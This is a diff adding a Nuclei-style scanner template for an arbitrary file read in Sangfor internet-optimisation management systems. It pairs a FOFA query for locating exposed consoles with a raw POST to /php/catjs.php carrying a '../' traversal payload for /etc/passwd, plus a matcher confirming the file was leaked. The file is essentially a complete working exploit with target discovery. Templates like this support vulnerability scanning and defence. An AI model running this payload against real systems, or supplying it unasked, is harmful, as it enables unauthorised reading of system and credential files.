@@ -1,0 +1,28 @@
+id: sangfor-sg-file-read
+info:
+  name: sangfor-sg-file-read
+  author: sb    
+  severity: critical
+  metadata:
+    fofa-query: title="SANGFOR上网优化管理"
+
+http:
+  - raw:
+    - |      
+      POST /php/catjs.php HTTP/1.1
+      Host: {{Hostname}}
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+      Content-Length: 35
+      Accept-Encoding: gzip, deflate
+      Connection: close
+      Content-Type: application/x-www-form-urlencoded
+      
+      ["../../../../../../../etc/passwd"]
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+          
